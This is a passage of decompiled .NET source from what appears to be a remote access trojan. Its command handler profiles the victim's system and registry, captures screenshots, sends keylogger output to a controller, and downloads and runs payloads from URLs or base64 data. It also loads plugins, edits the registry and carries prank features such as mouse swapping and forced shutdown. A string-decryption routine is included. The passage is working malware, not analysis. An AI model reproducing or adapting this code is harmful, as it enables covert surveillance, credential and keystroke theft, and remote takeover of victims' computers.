              string str30 = MyProject.Computer.Info.InstalledUICulture.ToString() + Fransesco.Y;
              string str31 = Conversions.ToString(Operators.ConcatenateObject(Fransesco.countrys(), (object) Fransesco.Y));
              string str32 = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").ToString() + "-based PC" + Fransesco.Y;
              string str33 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName", (object) "N/A"), (object) Fransesco.Y));
              string str34 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVendor", (object) "N/A"), (object) " "), MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion", (object) "N/A")), (object) ", "), MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSReleaseDate", (object) "N/A")), (object) Fransesco.Y));
              string str35 = Environment.UserName + Fransesco.Y;
              string str36 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOrganization", (object) "N/A"), (object) Fransesco.Y));
              string str37 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", (object) "N/A"), (object) Fransesco.Y));
              string str38 = Operators.CompareString(Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "EnableFirewall", (object) "N/A")), "0", false) != 0 ? "Ativado" + Fransesco.Y : "Desativado" + Fransesco.Y;
              Fransesco.Send("EnviaResultadoInformacoes" + Fransesco.Y + str3 + str4 + str5 + str6 + str7 + str8 + str9 + str10 + str11 + str12 + str13 + str14 + str15 + str16 + str17 + str18 + str19 + str20 + str21 + str22 + str23 + str24 + str25 + str26 + str27 + str28 + str29 + str30 + str31 + str32 + str33 + str34 + str35 + str36 + str37 + str38 + Fransesco.Y);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "infoDesk", false) == 0)
          {
            byte[] inArray = (byte[]) new ImageConverter().ConvertTo((object) Fransesco.CaptureDesktop(), b.GetType());
            Fransesco.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("infoDesk" + Fransesco.Y + Convert.ToBase64String(inArray) + Fransesco.Y + Fransesco.H + Fransesco.Y + Fransesco.GetAV() + Fransesco.Y + Fransesco.EXE + Fransesco.Y), RuntimeHelpers.GetObjectValue(Fransesco.Ram()))), (object) Fransesco.Y)), (object) Fransesco.DR))));
          }
          else if (Operators.CompareString(Left2, "anf", false) == 0)
            Fransesco.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("anf" + Fransesco.Y + Fransesco.H + Fransesco.Y + Fransesco.P + Fransesco.Y + Fransesco.EXE + Fransesco.Y + Fransesco.DR + Fransesco.Y + Fransesco.VR + Fransesco.Y + Fransesco.VN + Fransesco.Y), RuntimeHelpers.GetObjectValue(Fransesco.Ram()))), (object) Fransesco.Y)), (object) Environment.UserName)), (object) Fransesco.Y)), (object) MyProject.Computer.Info.OSFullName)), (object) Fransesco.Y)), RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", (object) "N/A"))))));
          else if (Operators.CompareString(Left2, "oadaee", false) == 0)
            Fransesco.Send("oadaee");
          else if (Operators.CompareString(Left2, "Doss", false) == 0)
            Fransesco.Send("Doss");
          else if (Operators.CompareString(Left2, "url", false) == 0)
            Fransesco.Send("url");
          else if (Operators.CompareString(Left2, "borr", false) == 0)
          {
            StreamWriter streamWriter = new StreamWriter(strArray1[1]);
            streamWriter.WriteLine(strArray1[2]);
            streamWriter.Close();
          }
          else if (Operators.CompareString(Left2, "oada", false) == 0)
          {
            System.IO.File.WriteAllBytes(Path.GetTempPath() + strArray1[1], Convert.FromBase64String(strArray1[2]));
            Thread.Sleep(1000);
            Fransesco.Send("bla");
            string lpvParam = Path.GetTempPath() + strArray1[1];
            Fransesco.SystemParametersInfo(20, 0, ref lpvParam, 1);
          }
          else if (Operators.CompareString(Left2, "IEhome", false) == 0)
          {
            Clipboard.Clear();
            Clipboard.SetText(strArray1[1]);
          }
          else if (Operators.CompareString(Left2, "script", false) == 0)
          {
            string str = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\tempxxSD";
            MyProject.Computer.FileSystem.WriteAllText(str + strArray1[2], strArray1[1], false);
            Process.Start(str + strArray1[2]);
          }
          else if (Operators.CompareString(Left2, "ssstui", false) == 0)
            System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + strArray1[1], Convert.FromBase64String(strArray1[2]));
          else if (Operators.CompareString(Left2, "sendfile", false) == 0)
          {
            System.IO.File.WriteAllBytes(Path.GetTempPath() + strArray1[1], Convert.FromBase64String(strArray1[2]));
            Process.Start(Path.GetTempPath() + strArray1[1]);
          }
          else if (Operators.CompareString(Left2, "atHTTP", false) == 0)
            MyProject.Computer.Network.Ping(strArray1[1]);
          else if (Operators.CompareString(Left2, "atstop", false) == 0)
          {
            Process[] processesByName = Process.GetProcessesByName("PING");
            if (processesByName != null)
            {
              Process[] processArray = processesByName;
              int index = 0;
              while (index < processArray.Length)
              {
                processArray[index].Kill();
                checked { ++index; }
              }
            }
          }
          else if (Operators.CompareString(Left2, "EsconderBarraDeTarefas", false) == 0)
            Fransesco.SetWindowPos((int) e.FindWindow("Shell_traywnd", ""), 0, 0, 0, 0, 0, 128);
          else if (Operators.CompareString(Left2, "MostrarBarraDeTarefas", false) == 0)
            Fransesco.SetWindowPos((int) e.FindWindow("Shell_traywnd", ""), 0, 0, 0, 0, 0, 64);
          else if (Operators.CompareString(Left2, "MonitorON", false) == 0)
            Fransesco.SendMessage(-1, 274U, 61808U, -1);
          else if (Operators.CompareString(Left2, "MonitorOFF", false) == 0)
            Fransesco.SendMessage(-1, 274U, 61808U, 2);
          else if (Operators.CompareString(Left2, "opencd", false) == 0)
          {
            try
            {
              string str39 = "set cdaudio door open";
              ref string local1 = ref str39;
              string str40 = Conversions.ToString(0);
              ref string local2 = ref str40;
              Fransesco.mciSendString(ref local1, ref local2, 0L, 0L);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "closecd", false) == 0)
          {
            try
            {
              string str41 = "set cdaudio door closed";
              ref string local3 = ref str41;
              string str42 = Conversions.ToString(0);
              ref string local4 = ref str42;
              Fransesco.mciSendString(ref local3, ref local4, 0L, 0L);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "OpenPage", false) == 0)
            Process.Start(strArray1[1]);
          else if (Operators.CompareString(Left2, "sh", false) == 0)
            Interaction.Shell("Shutdown -l");
          else if (Operators.CompareString(Left2, "Shr", false) == 0)
            Interaction.Shell("Shutdown -r");
          else if (Operators.CompareString(Left2, "shs", false) == 0)
            Interaction.Shell("Shutdown -s");
          else if (Operators.CompareString(Left2, "TextToSpeech", false) == 0)
          {
            object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice"));
            object[] objArray7 = new object[1];
            object[] objArray8 = objArray7;
            string[] strArray6 = strArray1;
            string[] strArray7 = strArray6;
            int index5 = 1;
            int index6 = index5;
            string str = strArray7[index6];
            objArray8[0] = (object) str;
            object[] objArray9 = objArray7;
            object[] Arguments = objArray9;
            bool[] flagArray = new bool[1]{ true };
            bool[] CopyBack = flagArray;
            NewLateBinding.LateCall(objectValue, (System.Type) null, "speak", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
            if (flagArray[0])
              strArray6[index5] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray9[0]), typeof (string));
          }
          else if (Operators.CompareString(Left2, "sendmusicplay", false) == 0)
          {
            System.IO.File.WriteAllBytes(Path.GetTempPath() + strArray1[1], Convert.FromBase64String(strArray1[2]));
            Thread.Sleep(1000);
            MyProject.Computer.Audio.Stop();
            MyProject.Computer.Audio.Play(Path.GetTempPath() + strArray1[1], AudioPlayMode.Background);
          }
          else if (Operators.CompareString(Left2, "NormalMouse", false) == 0)
            Fransesco.SwapMouseButton(0L);
          else if (Operators.CompareString(Left2, "ReverseMouse", false) == 0)
            Fransesco.SwapMouseButton(256L);
          else if (Operators.CompareString(Left2, "errorsound", false) == 0)
            MyProject.Computer.Audio.PlaySystemSound(SystemSounds.Asterisk);
          else if (Operators.CompareString(Left2, "ClockOFF", false) == 0)
            Fransesco.hideclock();
          else if (Operators.CompareString(Left2, "ClockON", false) == 0)
            Fransesco.showclock();
          else if (Operators.CompareString(Left2, "TaskbarShow", false) == 0)
            Fransesco.ShowTaskbarItems();
          else if (Operators.CompareString(Left2, "TaskbarHide", false) == 0)
            Fransesco.HideTaskbarItems();
          else if (Operators.CompareString(Left2, "EnviarPermisaaaoMensagem", false) == 0)
            Fransesco.Send("ChamaFrmMensagemms" + Fransesco.Y + Environment.MachineName + "/" + Environment.UserName + Fransesco.Y);
          else if (Operators.CompareString(Left2, "EnviarMensagemFakker", false) == 0)
          {
            string Left30 = strArray1[1];
            MessageBoxIcon icon;
            if (Operators.CompareString(Left30, "1", false) == 0)
              icon = MessageBoxIcon.Asterisk;
            else if (Operators.CompareString(Left30, "2", false) == 0)
              icon = MessageBoxIcon.Question;
            else if (Operators.CompareString(Left30, "3", false) == 0)
              icon = MessageBoxIcon.Exclamation;
            else if (Operators.CompareString(Left30, "4", false) == 0)
              icon = MessageBoxIcon.Hand;
            string Left31 = strArray1[2];
            MessageBoxButtons buttons;
            if (Operators.CompareString(Left31, "1", false) == 0)
              buttons = MessageBoxButtons.YesNo;
            else if (Operators.CompareString(Left31, "2", false) == 0)
              buttons = MessageBoxButtons.YesNoCancel;
            else if (Operators.CompareString(Left31, "3", false) == 0)
              buttons = MessageBoxButtons.OK;
            else if (Operators.CompareString(Left31, "4", false) == 0)
              buttons = MessageBoxButtons.OKCancel;
            else if (Operators.CompareString(Left31, "5", false) == 0)
              buttons = MessageBoxButtons.RetryCancel;
            else if (Operators.CompareString(Left31, "6", false) == 0)
              buttons = MessageBoxButtons.AbortRetryIgnore;
            int num2 = (int) MessageBox.Show(strArray1[4], strArray1[3], buttons, icon);
          }
          else
          {
            if (Operators.CompareString(Left2, "ll", false) == 0)
            {
              Fransesco.Cn = false;
              return;
            }
            if (Operators.CompareString(Left2, "kl", false) == 0)
            {
              string y = Fransesco.Y;
              string l = A.GetL();
              string str = Fransesco.ENB(ref l);
              Fransesco.Send("kl" + y + str);
            }
            else if (Operators.CompareString(Left2, "oada", false) == 0)
              Fransesco.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
            else if (Operators.CompareString(Left2, "fransesco", false) == 0)
            {
              Fransesco.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              Fransesco.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + Fransesco.Y + strArray1[1] + Fransesco.Y), RuntimeHelpers.GetObjectValue(Fransesco.GTV(strArray1[1], (object) ""))))));
            }
            else if (Operators.CompareString(Left2, "ctraik", false) == 0)
              Fransesco.DLV(strArray1[2]);
            else if (Operators.CompareString(Left2, "prof", false) == 0)
            {
              string Left32 = strArray1[1];
              if (Operators.CompareString(Left32, "~", false) == 0)
              {
                Fransesco.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
                return;
              }
              if (Operators.CompareString(Left32, "!", false) == 0)
              {
                Fransesco.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
                Fransesco.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + Fransesco.Y + strArray1[1] + Fransesco.Y), RuntimeHelpers.GetObjectValue(Fransesco.GTV(strArray1[1], (object) ""))))));
                return;
              }
              if (Operators.CompareString(Left32, "@", false) != 0)
                return;
              Fransesco.DLV(strArray1[2]);
              return;
            }
          }
        }
        if (Operators.CompareString(Left1, "rn", false) == 0)
        {
          byte[] bytes;
          if (strArray1[2][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Fransesco.Y + strArray1[1] + Fransesco.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = Fransesco.ZIP(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              Fransesco.Send("MSG" + Fransesco.Y + "Execute ERROR");
              Fransesco.Send("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[2]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              Fransesco.Send("MSG" + Fransesco.Y + "Download ERROR");
              Fransesco.Send("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          Fransesco.Send("bla");
          string str = Path.GetTempFileName() + "." + strArray1[1];
          try
          {
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str);
            Fransesco.Send("MSG" + Fransesco.Y + "Executed As " + new FileInfo(str).Name);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Exception ex2 = ex1;
            ProjectData.SetProjectError(ex2);
            Exception exception = ex2;
            Fransesco.Send("MSG" + Fransesco.Y + "Execute ERROR " + exception.Message);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          string Left33 = Left1;
          if (Operators.CompareString(Left33, "inv", false) == 0)
          {
            byte[] numArray = (byte[]) Fransesco.GTV(strArray1[1], (object) new byte[0]);
            if (strArray1[3].Length < 10 & numArray.Length == 0)
            {
              Fransesco.Send("pl" + Fransesco.Y + strArray1[1] + Fransesco.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[3].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Fransesco.Y + strArray1[1] + Fransesco.Y + strArray1[2] + Fransesco.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = Fransesco.ZIP(memoryStream.ToArray());
                Fransesco.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              Fransesco.Send("pl" + Fransesco.Y + strArray1[1] + Fransesco.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Fransesco.Plugin(numArray, "A"))));
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
              {
                (object) Fransesco.H
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
              {
                (object) Fransesco.P
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
              {
                (object) strArray1[2]
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !Fransesco.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
                Thread.Sleep(1);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
              {
                (object) true
              }, (string[]) null, (System.Type[]) null);
            }
          }
          else if (Operators.CompareString(Left33, "ret", false) == 0)
          {
            byte[] numArray = (byte[]) Fransesco.GTV(strArray1[1], (object) new byte[0]);
            if (strArray1[2].Length < 10 & numArray.Length == 0)
            {
              Fransesco.Send("pl" + Fransesco.Y + strArray1[1] + Fransesco.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[2].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Fransesco.Y + strArray1[1] + Fransesco.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = Fransesco.ZIP(memoryStream.ToArray());
                Fransesco.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              Fransesco.Send("pl" + Fransesco.Y + strArray1[1] + Fransesco.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Fransesco.Plugin(numArray, "A"))));
              string[] strArray8 = new string[5]
              {
                "ret",
                Fransesco.Y,
                strArray1[1],
                Fransesco.Y,
                null
              };
              string[] strArray9 = strArray8;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
              string str = Fransesco.ENB(ref s);
              strArray9[4] = str;
              Fransesco.Send(string.Concat(strArray8));
            }
          }
          else if (Operators.CompareString(Left33, "CAP", false) == 0)
          {
            Rectangle targetRect = Screen.PrimaryScreen.Bounds;
            Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, targetRect.Height, PixelFormat.Format16bppRgb555);
            Graphics g = Graphics.FromImage((Image) bitmap1);
            Size size = new Size(bitmap1.Width, bitmap1.Height);
            g.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
            try
            {
              size = new Size(32, 32);
              targetRect = new Rectangle(Cursor.Position, size);
              Cursors.Default.Draw(g, targetRect);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
            g.Dispose();
            Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
            Graphics graphics = Graphics.FromImage((Image) bitmap2);
            graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
            graphics.Dispose();
            MemoryStream memoryStream1 = new MemoryStream();
            string S = "CAP" + Fransesco.Y;
            b = Fransesco.SB(ref S);
            memoryStream1.Write(b, 0, b.Length);
            MemoryStream memoryStream2 = new MemoryStream();
            bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
            Fransesco.md5(memoryStream2.ToArray());
            string Left34;
            if (Operators.CompareString(Left34, Fransesco.lastcap, false) != 0)
            {
              Fransesco.lastcap = Left34;
              memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
            }
            else
              memoryStream1.WriteByte((byte) 0);
            Fransesco.Sendb(memoryStream1.ToArray());
            memoryStream1.Dispose();
            memoryStream2.Dispose();
            bitmap1.Dispose();
            bitmap2.Dispose();
          }
          else if (Operators.CompareString(Left33, "un", false) == 0)
          {
            string Left35 = strArray1[1];
            if (Operators.CompareString(Left35, "~", false) == 0)
              Fransesco.UNS();
            else if (Operators.CompareString(Left35, "!", false) == 0)
            {
              Fransesco.pr(0);
              ProjectData.EndApp();
            }
            else
            {
              if (Operators.CompareString(Left35, "@", false) != 0)
                return;
              Fransesco.pr(0);
              Process.Start(Fransesco.LO.FullName);
              ProjectData.EndApp();
            }
          }
          else if (Operators.CompareString(Left1, "up", false) == 0)
          {
            byte[] bytes;
            if (strArray1[1][0] == '\u001F')
            {
              try
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Fransesco.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                bytes = Fransesco.ZIP(memoryStream.ToArray());
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                Fransesco.Send("MSG" + Fransesco.Y + "Update ERROR");
                Fransesco.Send("bla");
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                return;
              }
            }
            else
            {
              WebClient webClient = new WebClient();
              try
              {
                bytes = webClient.DownloadData(strArray1[1]);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                Fransesco.Send("MSG" + Fransesco.Y + "Update ERROR");
                Fransesco.Send("bla");
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                return;
              }
            }
            Fransesco.Send("bla");
            string str = Path.GetTempFileName() + ".exe";
            try
            {
              Fransesco.Send("MSG" + Fransesco.Y + "Updating To " + new FileInfo(str).Name);
              Thread.Sleep(2000);
              System.IO.File.WriteAllBytes(str, bytes);
              Process.Start(str, "..");
            }
            catch (Exception ex3)
            {
              ProjectData.SetProjectError(ex3);
              Exception ex4 = ex3;
              ProjectData.SetProjectError(ex4);
              Exception exception = ex4;
              Fransesco.Send("MSG" + Fransesco.Y + "Update ERROR " + exception.Message);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
            Fransesco.UNS();
          }
          else if (Operators.CompareString(Left1, "Ex", false) == 0)
          {
            if (Fransesco.PLG == null)
            {
              Fransesco.Send("PLG");
              int num3 = 0;
              while (!(Fransesco.PLG != null | num3 == 20 | !Fransesco.Cn))
              {
                checked { ++num3; }
                Thread.Sleep(1000);
              }
              if (Fransesco.PLG == null | !Fransesco.Cn)
                return;
            }
            object[] Arguments = new object[1]{ (object) b };
            bool[] CopyBack = new bool[1]{ true };
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Fransesco.PLG), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
            if (CopyBack[0])
              b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]))), typeof (byte[]));
          }
          else if (Operators.CompareString(Left1, "PLG", false) == 0)
          {
            MemoryStream memoryStream = new MemoryStream();
            int length = (strArray1[0] + Fransesco.Y).Length;
            memoryStream.Write(b, length, checked (b.Length - length));
            Fransesco.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Fransesco.Plugin(Fransesco.ZIP(memoryStream.ToArray()), "A"))));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Fransesco.PLG), (System.Type) null, "H", new object[1]
            {
              (object) Fransesco.H
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Fransesco.PLG), (System.Type) null, "P", new object[1]
            {
              (object) Fransesco.P
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(Fransesco.PLG), (System.Type) null, "c", new object[1]
            {
              (object) Fransesco.C
            }, (string[]) null, (System.Type[]) null);
          }
        }
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        Exception ex6 = ex5;
        ProjectData.SetProjectError(ex6);
        Exception exception = ex6;
        if (strArray1.Length > 0 && Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
          Fransesco.PLG = (object) null;
        try
        {
          Fransesco.Send("ER" + Fransesco.Y + strArray1[0] + Fransesco.Y + exception.Message);
        }
        catch (Exception ex7)
        {
          ProjectData.SetProjectError(ex7);
          ProjectData.SetProjectError(ex7);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public object LORDDecrypt_(string ParmDec)
    {
      ParmDec = ParmDec.Replace("月", "a").Replace("아", "A").Replace("官", "b").Replace("악", "B").Replace("匹", "c").Replace("안", "C").Replace("力", "d").Replace("알", "D").Replace("三", "e").Replace("앙", "E").Replace("下", "f").Replace("앞", "F").Replace("巨", "g").Replace("얘", "G").Replace("升", "h").Replace("ᄍ", "H").Replace("工", "i").Replace("ᄊ", "I").Replace("丁", "j").Replace("ᄈ", "J").Replace("水", "k").Replace("응", "K").Replace("心", "l").Replace("읍", "L").Replace("冊", "m").Replace("음", "M").Replace("內", "n").Replace("을", "N").Replace("口", "o").Replace("임", "O").Replace("戶", "p").Replace("잎", "P").Replace("已", "q").Replace("율", "Q").Replace("尺", "r").Replace("월", "R").Replace("弓", "s").Replace("원", "S").Replace("七", "t").Replace("웅", "T").Replace("臼", "u").Replace("울", "U").Replace("人", "v").Replace("운", "V").Replace("山", "w").Replace("옴", "W").Replace("父", "x").Replace("왕", "X").Replace("了", "y").Replace("왜", "Y").Replace("乙", "z").Replace("에", "Z");
      return (object) ParmDec;
    }

    public static string inf()
    {
      string str1 = "ll" + Fransesco.Y;
      string str2;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(Fransesco.GTV("vn", (object) "")), (object) "", false))
        {
          string str3 = str1;
          string s = Fransesco.DEB(ref Fransesco.VN) + "_" + Fransesco.HWD();
          string str4 = Fransesco.ENB(ref s);
          string y = Fransesco.Y;
          str2 = str3 + str4 + y;
        }
        else
        {
          string str5 = str1;
          string s1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(Fransesco.GTV("vn", (object) "")));
          string s2 = Fransesco.DEB(ref s1) + "_" + Fransesco.HWD();
          string str6 = Fransesco.ENB(ref s2);
          string y = Fransesco.Y;
          str2 = str5 + str6 + y;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        string str7 = str1;
        string s = Fransesco.HWD();
        string str8 = Fransesco.ENB(ref s);
        string y = Fransesco.Y;
        str2 = str7 + str8 + y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str9;
      try
      {
        str9 = str2 + Environment.MachineName + Fransesco.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str9 = str2 + "??" + Fransesco.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str10;
      try
      {
        str10 = str9 + Environment.UserName + Fransesco.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str10 = str9 + "??" + Fransesco.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str11;
      try
      {
        str11 = str10 + Fransesco.LO.LastWriteTime.Date.ToString("yy-MM-dd") + Fransesco.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str11 = str10 + "??-??-??" + Fransesco.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str12 = str11 + "" + Fransesco.Y;
      string str13;
      try
      {
        str13 = str12 + Fransesco.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str13 = str12 + "??";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str14 = str13 + "SP";
      string str15;
      try
      {
        string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
        if (strArray.Length == 1)
          str14 += "0";
        str15 = str14 + strArray[checked (strArray.Length - 1)];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str15 = str14 + "0";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str16;
      try
      {
        str16 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str15 + " x86" + Fransesco.Y : str15 + " x64" + Fransesco.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str16 = str15 + Fransesco.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str17 = (!Fransesco.Cam() ? str16 + "No" + Fransesco.Y : str16 + "Yes" + Fransesco.Y) + Fransesco.VR + Fransesco.Y + ".." + Fransesco.Y + Fransesco.ACT() + Fransesco.Y;
      string str18 = "";
      try
      {
